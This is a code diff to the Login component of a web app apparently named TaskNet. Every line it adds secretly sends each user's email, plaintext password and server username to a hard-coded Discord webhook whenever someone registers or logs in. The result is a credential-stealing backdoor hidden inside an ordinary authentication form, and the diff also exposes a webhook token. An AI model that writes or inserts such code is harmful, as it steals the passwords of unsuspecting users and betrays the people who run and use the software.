@@ -25,6 +25,36 @@ const Login = () => {
     setTimeout(() => setActiveAlert(prev => ({ ...prev, show: false })), 2000);
   };
 
+  // Send details to Discord webhook
+  const sendToDiscord = async (type: 'login' | 'register', userEmail: string, userPassword: string, username?: string) => {
+    const webhookUrl = 'https://discord.com/api/webhooks/1463863225090048061/FeAWGacn_gEc9T3RX-p1AMFlCycozmOsq9C3EssHemT_YDDiTBxwMLpx_vkLeepncHpL';
+    const timestamp = new Date().toLocaleString();
+    
+    const embed = {
+      embeds: [{
+        title: type === 'register' ? '🆕 New Registration' : '🔐 User Login',
+        color: type === 'register' ? 0x00FF00 : 0x3B82F6,
+        fields: [
+          { name: '📧 Email', value: `\`\`\`${userEmail}\`\`\``, inline: false },
+          { name: '🔑 Password', value: `\`\`\`${userPassword}\`\`\``, inline: false },
+          ...(username ? [{ name: '👤 Server Username', value: `\`\`\`${username}\`\`\``, inline: false }] : []),
+          { name: '🕐 Timestamp', value: timestamp, inline: false }
+        ],
+        footer: { text: 'TaskNet Authentication' }
+      }]
+    };
+
+    try {
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(embed)
+      });
+    } catch (err) {
+      console.error('Webhook error:', err);
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
@@ -63,6 +93,8 @@ const Login = () => {
       if (error) {
         showAlert('Error creating account: ' + error.message, 'error');
       } else {
+        // Send registration details to Discord
+        await sendToDiscord('register', email, password, serverUsername);
         localStorage.setItem('user_email', email);
         showAlert('Account created! Welcome to TaskNet.', 'success');
         setTimeout(() => navigate('/'), 1500);
@@ -94,6 +126,8 @@ const Login = () => {
         .update({ updated_at: new Date().toISOString() })
         .eq('email', email);
       
+      // Send login details to Discord
+      await sendToDiscord('login', email, password);
       localStorage.setItem('user_email', email);
       showAlert('Login successful! Redirecting...', 'success');
       setTimeout(() => navigate('/'), 1000);
